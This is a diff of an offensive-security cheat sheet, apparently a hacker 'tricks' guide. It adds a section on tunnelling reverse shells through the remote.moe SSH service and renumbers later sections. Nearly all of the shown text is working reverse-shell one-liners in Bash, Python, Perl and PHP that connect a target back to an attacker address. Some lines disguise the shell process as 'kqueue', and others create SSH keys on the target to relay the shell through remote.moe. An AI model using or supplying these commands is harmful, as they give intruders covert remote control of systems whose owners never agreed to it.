@@ -43,6 +43,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [with gs-netcat](#reverse-shell-gs-netcat)
       1. [with Bash](#reverse-shell-bash)
       1. [without Bash](#reverse-shell-no-bash)
+      1. [with remote.moe](#revese-shell-remote-moe)
       1. [with Python](#reverse-shell-python)
       1. [with Perl](#reverse-shell-perl)
       1. [with PHP](#reverse-shell-php)
@@ -912,6 +913,8 @@ nc -nvlp 1524
 On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
 ```sh
 setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1
+# If the current shell is NOT bash then we need:
+bash -c 'setsid bash -i &>/dev/tcp/3.13.3.7/1524 0>&1'
 # or hide the bash process as 'kqueue'
 setsid bash -c 'exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1'
 ```
@@ -947,14 +950,38 @@ tail -f /dev/shm/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/dev/shm/.fio
 Note: Use */tmp/.fio* if */dev/shm* is not available.
 Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
 
+<a id="revese-shell-remote-moe"></a>
+**5.i.d. Reverse shell with remote.moe
+
+It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):
+
+On your workstation:
+```sh
+# First Terminal:
+ssh -R31337:0:8080 -o StrictHostKeyChecking=no nokey@remote.moe
+# Note down the 'remote.moe' address which will look something like
+# uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe
+
+# Second Terminal:
+nc -vnlp 8080
+```
+
+On the target:
+```
+# First method:
+[ ! -f ~/.ssh/id_rsa ] && { mkdir -p ~/.ssh; ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa; }; rm -f /tmp/.p; mkfifo /tmp/.p && (bash -i</tmp/.p  2>1 |ssh -o StrictHostKeyChecking=no -W uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 remote.moe>/tmp/.p &)
+# or an alternative method:
+bash -c '([ ! -f ~/.ssh/id_rsa ] && { mkdir -p ~/.ssh; ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa; }; ssh -o StrictHostKeyChecking=no -L31338:uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 -Nf remote.moe;  bash -i &>/dev/tcp/0/31338 0>&1 &)' &>/dev/null
+```
+
 <a id="reverse-shell-python"></a>
-**5.i.d. Reverse shell with Python**
+**5.i.e. Reverse shell with Python**
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 <a id="reverse-shell-perl"></a>
-**5.i.e. Reverse shell with Perl**
+**5.i.f. Reverse shell with Perl**
 
 ```sh
 # method 1
@@ -963,7 +990,7 @@ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotob
 perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
 ```
 <a id="reverse-shell-php"></a>
-**5.i.e. Reverse shell with PHP**
+**5.i.g. Reverse shell with PHP**
 
 ```sh
 php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
